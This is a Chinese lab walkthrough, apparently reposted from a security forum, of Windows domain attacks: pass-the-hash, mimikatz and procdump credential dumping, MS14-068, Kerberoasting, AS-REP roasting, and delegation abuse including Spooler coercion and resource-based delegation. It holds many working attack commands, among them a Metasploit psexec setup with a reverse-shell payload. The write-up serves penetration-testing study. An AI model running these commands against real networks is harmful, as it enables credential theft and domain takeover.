<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9382#toc-20)

PTH
---

如果找到了某个用户的 ntlm hash，就可以拿这个 ntlm hash 当作凭证进行远程登陆了  
其中若 hash 加密方式是 rc4 ，那么就是 pass the hash  
若加密方式是 aes key, 那么就是 pass the key  
注意 NTLM 和 kerberos 协议均存在 PTH:  
NTLM 自然不用多说  
kerberos 协议也是基于用户的 client hash 开始一步步认证的，自然也会受 PTH 影响

那前提就是要获取 hash 值了

### HASH 获取

1. 使用 meterpreter 里的 mimikatz 模块

```
meterpreter>load mimikatz
meterpreter>mimikatz_command -f mimikatz的指令
privilege::debug 提权  samdump::hashes dump哈希  
或者
meterpreter>msv/kerberos/widgst
```

2. 使用 meterpreter 自带的 hash 获取模块

```
meterpreter>hashdump
meterpreter>run windows/gather/smart_hashdump   (推荐使用这个)
```

3. 向目标机上传 mimikatz 远程调用 mimikatz.exe dump 出 hash，mimikatz 需要免杀处理  
意思就是既然我们获取到了 shell，我们直接向目标机上传一个 mimikatz 然后在 shell 里使用它就行了. 使用方法为 cmd 窗口打开 mimikatz.exe，进入 mimikatz 终端，然后输入 mimikatz 指令即可

4. 上传 procdump 到目标机，获取到 lsass.dmp 文件后将其传回本地又 mimikatz 来 dump 哈希

procdump.exe 是微软自带的程序，所以不会触发杀毒。所以可以通过它传回 lsass.dmp 本地提取 hash

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp
然后将其传回本地
通过mimikatz.exe分别执行以下命令
"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png)

[Procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)：[https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)  
[mimikatz](https://github.com/gentilkiwi/mimikatz/releases)：[https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)

5. 使用 cobalt strike 获取 hash

```
beacon>hashdump
beacon>mimikatz mimikatz指令
```

6. 利用 sam 表

mimikatz 在线读 sam 表中的 hash

```
privilege::debug
token::elevate
lsadump::sam
```

将 sam 表下载到本地由 mimikatz 分析

```
reg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM
在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析
mimikatz运行
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
Domain : STU1
SysKey : fd4639f4e27c79683ae9fee56b44393f
Local SID : S-1-5-21-1982601180-2087634876-2293013296

SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : liukaifeng01
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### hash 传递攻击 PTH （Pass the Hash)

1.msf 里使用 psexec 模块

```
msf5 exploit(multi/handler) > use exploit/windows/smb/psexec  //以root启动msf
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set lhsot 192.168.64.133
lhsot => 192.168.64.133
msf5 exploit(windows/smb/psexec) > set lhost 192.168.64.133
lhost => 192.168.64.133
msf5 exploit(windows/smb/psexec) > set lport 443
lport => 443
msf5 exploit(windows/smb/psexec) > set rhost 192.168.52.138
rhost => 192.168.52.138
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > set SMBPass 8a963371a63944419ec1adf687bb1be5  //一般选择NTLM HASH
SMBPass => 8a963371a63944419ec1adf687bb1be5
msf5 exploit(windows/smb/psexec) > run
```

2. 使用 mimikatz

我们在目标机里放置 mimikatz.exe 然后执行以下命令

```
sekurlsa::pth /user:administrator /domain:"xxx.com" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  //自行修改
```

之后便会弹出一个 cmd 窗口，在这个窗口里链接机器即可

```
net use \\192.168.222.131\c$
```

3. 使用 cobalt strike

在 cobalt strike 里找到域控，然后使用 psexec 模块，选择一个本地 hash 即可。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png)

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png)

MS14-068
--------

这个洞的危害很大，可以让任意域用户提权到域管。  
适用版本: server 2000 以上  
补丁: kb3011780

### M14068 利用

1. 工具 kekeo [https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718](https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718)

具体方法为，在 kekeo 里先执行 kerberos::purge 清空票据  
然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt  
即可。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png)

然后就 dir \ 域控 \ c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)

2.golenpac [https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe](https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe)

这个工具好用,

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png)

执行类似上述命令，就能返回一个域控的 system 权限的 cmd shell 回来，感觉蛮好用  
另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地 system 权限用户.  
但返回的似乎不是域控？

kerberoast
----------

Kerberoast 攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码

### How to get SPN

如何得到域中的所有 SPN？

**1.setspn**  
很简单，只需执行

```
setspn -q */*
```

即可

**2.kerberoast 工具集的 GetUserSpns powershell 脚本**

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132445.png)

### How to get HASH

如何得到 hash？  
有如下方法

**1.Rubeus.exe**

这个工具 github 上就有，但是 clone 下来后需要自己编译成 exe.

然后执行 Rubeus.exe kerberoast 指令即可

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132502.png)

**2.mimikatz**

mimikatz 真的神器。  
通过命令 kerberos::ask /target: 你所指定的 SPN,

[![](http://www.const27.com/wp-content/uploads/2020/09/image-33.png)](http://www.const27.com/wp-content/uploads/2020/09/image-33.png)

即可通过认证的方式得到一个 ST。  
然后我们在 kerberos::list 里可以看到我们想要的 ST

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132529.png)

**3.powershell**

越来越发现 powershell 在域渗透中的重要性了  
输入以下指令，即可完成 HASH 获取

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/win7.xie.com:3306/MySQL"
```

然后 mimikatz 导出即可

### How to export hash

获得了 ST 票据，但怎么导出？

**1.mimikatz**

导出所有票据

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132544.png)

可以发现生成了 kirbi 文件。这就是我们所需要的 hash 了

**2.Empire Powershell 框架**

github:[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

我们通过这个框架可以导出 hashcat 格式的 hash.

```
Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132627.png)

### How to crack HASH

如何破解 HASH?

**1.HASHCAT**

这个工具需要让 hash 格式为 hashcat 模式才能进行破解。kribi 文件不能放入 hashcat 进行破解.

```
hashcat -m 13110 pass.txt hash.txt
```

**2.kerberoast 中的 tgsrepcrack.py**

支持 kribi 文件破解

```
python3 tgsrepcrack.py pass.txt xxx.kribi
```

### How to use Kerberoast

既然我们都把 ST 的加密 hash 都破解了，那么我们就可以随便改 ST 中的票据内容了..\ 这里使用的是 kerberoast 工具集里的 kerberoast.py

```
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
## 将票据权限改为administrator
kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存
```

AS_REP Roast
------------

较 Kerberoast 来说，比较鸡肋。  
它的原理是在不开启 kerberos 预身份验证的前提下，获得其他用户的 AS_RES，并破解加密 session key 的 client hash。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132642.png)

### How to get HASH

**1.Rubeus**

```
Rubeus.exe asreproast
```

然后就会搜索域中不需要 kerberos 预验证的用户，并获得 ASREP。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132654.png)

**2.Empire 框架与 ASREPRoast.ps1**

使用 Empire 框架下的 powerview.ps1 查找域中设置了 “不需要 kerberos 预身份验证” 的用户

```
Import-Module .\powerview.ps1
 Get-DomainUser -PreauthNotRequired
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132707.png)然后用 ASREPRoast.ps1 ：[https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) 获取指定用户的 AS-REPhash

```
Import-Module ASREPRoast.ps1
Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt
```

就会生成一个 hash 数据文件了

### How to crack hash

将生成的 HASH 保存起来，并在下图处加入 $23

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132743.png)

然后丢给 hashcat 跑

```
hashcat -m 18200 hash.txt pass.txt
```

注意这里的 pass.txt 是自己的明文字典… 之前我还一直以为是爆破出来的结果.  
原来是一个一个的用明文字典去爆破。

委派攻击
----

### 域委派

域委派是一种域内主机的行为，使某个服务可以以访问的用户的身份去访问另外一个服务。  
为什么需要域委派呢，比如现在有 web 服务器和文件服务器，当用户 A 访问 web 服务器去请求某个资源时，web 服务器上本身并没有该资源，所以 web 服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：  
用户 A 访问 web 服务器，服务器再以用户 A 的身份去访问文件服务器。  
发生域委派的服务一般为机器账户和服务账户。  
域委派分为三种：非约束性委派，约束性委派，基于资源的约束性委派

#### 非约束性委派

非约束性委派的原理是：用户想访问服务 A，于是向 KDC 提交认证，KDC 发现 A 是非约束性委派，于是会把 TGT 放在 ST 中一并给用户。然后用户用这个 ST 去访问服务 A，服务 A 就相当于获得了用户的 TGT，把 TGT 放入 lsass 进程，然后就可以拿着用户的 TGT 以用户的身份去访问所有用户权限能够访问的服务了。

非约束性委派的启用：

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134709.png)

为某账户启用 信任此计算机来委派任何服务 即开启非约束性委派。  
开启后在该用户的 ACL 属性会多出一个 flag : WORKSTATION_TRUSTED_FOR_DELEGATION (图截不完，反正这个 flag 就在箭头所指处的后面)

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217134749.png)

非约束委派的设置需要`SeEnableDelegation` 特权，该特权通常仅授予域管理员  
这里说个题外话，域控主机默认是非约束性委派

#### 约束性委派

非约束性委派是很不安全的（因为控制了开启非约束性委派的机器，就相当于获得了上面的所有其他用户的 TGT），所以更安全的约束性委派诞生了。  
约束性委派多了两个委派协议，S4U2SELF S4U2PROXY，并且限制了被设置委派的服务的访问范围：仅能被委派到被指定的服务。

约束性委派的大致流程：  
用户访问开启约束性委派的服务 A  
（情况一：无 S4U2SELF 参与）首先需要经过 KDC 认证，KDC 发现服务 A 开启了约束性委派，于是在 TGS_RES 返回给用户 ST1（可转发 ST），用户拿着 ST1 访问服务 A，服务 A 先与 KDC 进行身份验证获得一个有效 TGT，然后拿着 ST1 经过 S4U2PROXY 协议向 KDC 发起 TGS_REQ，KDC 返回 ST2（用户身份的 ST），然后服务 A 拿着 ST2 访问指定服务。  
（情况二：有 S4U2SELF 参与）用户通过其他方式（如 NTLM 认证，表单认证等）获取了服务 A 的信任，但是此时服务 A 并没有来自用户的 ST1，按情况一中的流程，服务 A 就不能完成委派。所以这个时候服务 A 会以自己的身份向 KDC 发起申请获取一个可转发 TGT（获取 KDC 信任），然后用这个 TGT 发起 TGS_REQ 获得指定用户的 ST1，既然获取了 ST1，就继续情况一中的流程即可了。

也就是说 S4U2SELF 是用户通过非 kerberos 协议完成认证的情况下，自动向 KDC 获取 ST1 的一个协议。  
而 S4U2PROXY 则是将 ST1 发给 KDC，使其变现为成自己可用的 ST2 的一个协议。

启用方法:

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135048.png)

其中被添加的服务则是允许被委派到的服务

若启用的是 仅使用 kerberos，那么 useraccountcontrol 属性仅有 workstation_trust_account.  
若启用任何身份验证协议，就会有 TrustedToAuthenticationForDelegation

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135100.png)

#### 基于资源的约束性委派

Windows Server 2012 中引入了基于资源的约束性委派。 只能在运行 Windows Server 2012 或 Windows Server 2012 R2 及以上的域控制器上配置  
基于资源的约束性委派，不需要域管理员前来设置，而把设置委派的权限交给了自身。  
其实就是可以摆脱域控来主动设置自己可以被哪些账户委派访问。

### 非约束性委派攻击

非约束性委派有巨大的安全问题，上面我们说过，非约束性委派的实质就是把用户的 TGT 存入 lassa 进程，从而模拟用户身份进行各种委派访问，所以我们只需控制非约束性委派攻击的机器，然后 dump 出所有的票据，就相当于获得了所有经过该服务进行约束性委派的用户的身份了。

#### 1. 进行非约束性委派账户扫描

这里提一下怎么创建有 SPN 的服务账户。  
只需再域控里执行 setspn -U -A spn_type username 即可  
其中 spn_type 即 SPN 的格式： MSSQLSvc/<fqdn>:[<port> | <instancename>]</instancename></port></fqdn>

*   **MSSQLSvc** 是要注册的服务。
*   <fqdn> 是服务器的完全限定域名。</fqdn>
*   <port> 是 TCP 端口号。</port>
*   <instancename> 是 SQL Server 实例的名称。</instancename>

这里我们随便输一个，比如 sb/caonima 这种都行.

这里采用 powersploit 下的 powerview.ps1  
根据我网上很多搜索结果，查找非约束委派服务账户只需调用  
`Get-NetUser -Unconstrained -Domain de1ay.com`  
这个命令即可，但是我下载下来的 powerview 里的 get-netuser 里却没有 unconstrained 参数，很烦。所以用一个比较原始的方法来判别（适合在用户少的情况下）  
直接调用 Get-NetUser -SPN 找到所有服务账户或者 Get-domaincomputer 找到所有机器账户，然后判断其 useraccountcontrl 里有没有 trusted_for_delegation, 若有，则说明开启了非约束性委派

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135123.png)

查询非约束委派机器账户则用  
`Get-domaincomputer -unconstrained -domain const.com`

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135236.png)

#### 2. 非约束性委派的攻击

仅能基于机器账户

如果我们获得了一个非约束性委派账户，我们就可以通过收集内存中的 tgt 达到任意用户访问的目的。

在被控制的非约束性委派机器上使用 mimikatz。  
`privilege::debug`提权  
`sekurlsa::tickets` 查看本机所有票据

通过以上命令获取票据, 如果管理员访问了本机的一些服务，那么它的 TGT 就会被截获放入内存。

我们模拟管理员调用非约束性委派机的 smb 服务

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135342.png)

我们回到非约束委派机，查看票据

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135358.png)

tgt 被截获, 我们用 sekurlas::tickets /export 把票据导出来

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135408.png)

然后 mimikatz 里使用  
`kerberos::ptt 票据文件名 将票据注入内存`  
访问域控 c$

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135419.png)

成功

#### 3. 非约束性委派配合 Spooler 打印机服务

纯非约束性委派攻击很鸡肋，因为必须要其他用户通过你进行委派访问。  
但是 ：利用 Windows 打印系统远程协议`（MS-RPRN）`中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用 MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification（Ex）`方法强制任何运行了`Spooler`服务的计算机以通过`Kerberos`或`NTLM`对攻击者选择的目标进行身份验证。 配合非约束性委派攻击，简直爆炸，可以主动拿到其他用户的 TGT。-  
而且 splooer 服务是默认运行的。（图源 WIN7）

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135445.png)

使其他主机强行与自己发生身份验证的脚本：需要自己编译一下 [https://github.com/leechristensen/SpoolSample.git](https://github.com/leechristensen/SpoolSample.git)

在此之前需要开启监听来自其他主机的 TGT，这里用的是 rubeus  
`Rubeus.exe monitor /interval:1 /filteruser:xx`

然后使用`SpoolSample.exe XX win7`, 让指定机器访问 WIN7 进行身份验证

然后获得 TGT，下班。

### 约束性委派的攻击

约束性委派的大致攻击流程是: (利用 S4U2SELF=>) 如果我们获得了约束性委派机的 NTLM hash 或者明文密码，我们就可以以此来向 KDC 发送一个 TGT 申请，获得一个可转发的 TGT。然后用这个可转发的 TGT 调用 S4U2SELF 协议，获得一个针对自己的 ST1 票据（其中 ST1 票据中的请求用户可以任意伪造）. 然后用这个 ST1 票据去向 KDC 请求 ST2，然后用 ST2 去访问服务，此时我们访问的身份就是我们任意伪造的身份了.

重点是只要获得了可转发 TGT，约束性委派机就可以任意伪造其他用户的 ST1 票据请求，太可怕了。

这个攻击的最大前提是我们得获得约束性委派账户的 NTLM HASH 或者明文密码, 然后我们才能成功的得到可转发 TGT，然后才能得到接下来的一切。

首先配置好约束性委派账户

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135527.png)

注意选用 使用任何身份验证协议

我们先信息搜集：看哪些用户是开启约束性委派的。一手 powerview 安排上

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135553.png)

箭头指出的地方就是可以被委派访问的服务

我们用 kekeo 来实现攻击.

```
tgt::ask /user:xx /domain:xx /password:xx /ticket:test.kirbi这里的/password可以改成/NTLM:xx
获得TGT转发票据

tgs::s4u /tgt:file_name /user:administrator /service:cifs/DC
tgt处改为刚刚得到的TGT文件的名字，这个命令执行后得到administrator身份的 ST2
```

把最后获得的票据用 mimikatz kerberos::ptt 注入内存，完事。

### 基于资源的约束性委派

refer:[https://xz.aliyun.com/t/7454](https://xz.aliyun.com/t/7454)

#### 原理的几个点：

1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的 ST 是不可被转发的。  
2. 基于资源的约束性委派主机 在被另一台主机委派访问时，在 S4U2PROXY 过程中提交过来的 ST 如果即使是不可转发的。KDC 依旧会返回有效的 ST2。  
3. 每个普通域用户默认可以创建至多十个机器账户（ 由 MachineAccountQuota 属性决定 ），每个机器账户被创建时都会自动注册 SPN: `RestrictedKrbHost/domain`和`HOST/domain`这两个 SPN

#### 攻击流程:

假设开启基于资源的约束性委派机器为 A  
1. 首先要有一个对当前计算机有写权限的账户，才能对 A 设置可以 被 委派访问的服务账户。  
2. 利用当前账户创建一个机器账户，并配置好机器账户到 A 的 基于资源的约束性委派  
3. 因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用 S4U2SELF 协议获得一个不可转发 ST。然后用这个不可转发 ST 通过 S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问 A cifs 服务的 ST2。  
4. 用 ST2 访问 A 的 CIFS 服务，权限获得。

#### 实操

这个攻击说白了就是个提权...

首先我们检查一下域控是否是 win2012 以上的主机，因为只有这样才能开启 基于资源的约束性委派。

我们使用 powersploit 下的 powerview 脚本。执行命令 get-netdomaincontroller

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png)

可以获得域控 WIN 版本

然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。  
直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png)

我们依旧使用 powerview。先调用  
`Get-DomainUser -Identity username -Properties objectsid`来获取当前用户 SID  
然后`Get-DomainObjectAcl -Identity 主机名 | ?{$_.SecurityIdentifier -match "刚刚得到的SID"}` 查看当前用户对某台主机是否有写权限。

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png)

如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。  
如图看到我们对 WIN7 进行操作

好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用 powermad 这个 ps 脚本可以很快捷的创建一个机器用户。[https://github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad)

```
Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString "hack" -AsPlainText -Force)
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png)

好的，我们添加了一个密码 hack，名为 hacksystem 的机器账户，接下来就是配置 hacksystem 到 WIN7 的委派了。我们需要做的，是修改 WIN7 的 `msDS-AllowedToActOnBehalfOfOtherIdentity`属性的值 ，这个操作我们用 powerview 实现。

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)"  
#这儿的sid是我们创建的#机器用户#evilsystem的sid
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png)

至于机器账户 SID 怎么获得，powerview 下的 `get-domiancomputer hacksystem`  
然后使用`Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity` 查看委派是否设置成功

`Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose`此命令可以清除 msds-allowedtoactonbehalfofotheridentity 属性的值

现在都统统设置好了，开始下一步吧。  
网上一般用的 rubeus，这里我用 kekeo 吧

```
Rubeus.exe hash /user:xxx /password:xxx /domain:xxx
```

本地运算出机器用户 ntlm hash 这里借用一下别人的图

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png)

`Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt` 写入票据

然后我在本机使用以上方法后 klist 一下，发现确实存在票据

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png)

但是 dir \test1\c$ 时本机莫名其妙不能进行 kerberos 验证，我服了》。。但不管怎样，我们拿到银票了

#### 敏感用户不可委派的绕过

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png)

若我们的 administrator 用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。

我们在以 administrator 账户身份进行 S4U 时，只能进行 S4U2SELF，不能进行 S4U2PROXY。我们用 `Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt`继续实验 administrator，发现确实是这样

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png)

此时我们用 rubeus.exe describe /ticker:S4Ubase64 加密的票据

[![](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png)](https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png)

可以发现 servicename 并没有指定某个服务，仅仅只有一个账户. 即发生了服务名称缺失的问题。很简单，把票据修改一下就行了. 网上很多说用这个工具  
[https://www.pkisolutions.com/tools/asn1editor/](https://www.pkisolutions.com/tools/asn1editor/)  
但实际上 rubeus 也能完成票据修改`rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt`

